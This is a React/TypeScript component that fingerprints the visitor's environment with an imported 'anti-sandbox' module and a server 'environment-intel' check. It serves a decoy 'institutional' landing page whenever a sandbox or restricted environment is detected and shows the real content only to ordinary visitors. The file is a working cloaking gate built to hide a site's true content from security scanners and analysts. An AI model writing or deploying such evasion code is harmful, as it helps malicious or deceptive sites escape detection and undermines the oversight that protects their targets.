'use client'

import { useEffect, useState, type ReactNode } from 'react'

import { runEnvironmentFingerprinting } from '../lib/anti-sandbox.js'
import { InstitutionalLandingPage } from './institutional-landing.js'

/**
 * Environment Fingerprinting gate — Institutional Landing Page fallback when sandbox-class environments are detected.
 */
export function EnvironmentFingerprintGate({ children }: { children: ReactNode }) {
  const [mode, setMode] = useState<'checking' | 'decoy' | 'live'>('checking')

  useEffect(() => {
    const sync = runEnvironmentFingerprinting()
    if (sync.requiresInstitutionalDecoy) {
      setMode('decoy')
      return
    }

    let cancelled = false
    void fetch('/api/environment-intel')
      .then((r) => r.json() as Promise<{ institutional_environment_assessment?: string }>)
      .then((j) => {
        if (cancelled) return
        if (j?.institutional_environment_assessment === 'restricted') setMode('decoy')
        else setMode('live')
      })
      .catch(() => {
        if (!cancelled) setMode('live')
      })

    return () => {
      cancelled = true
    }
  }, [])

  if (mode === 'checking') {
    return <main style={{ minHeight: '100vh', background: '#0c0e12' }} aria-busy="true" />
  }

  if (mode === 'decoy') return <InstitutionalLandingPage />

  return <>{children}</>
}
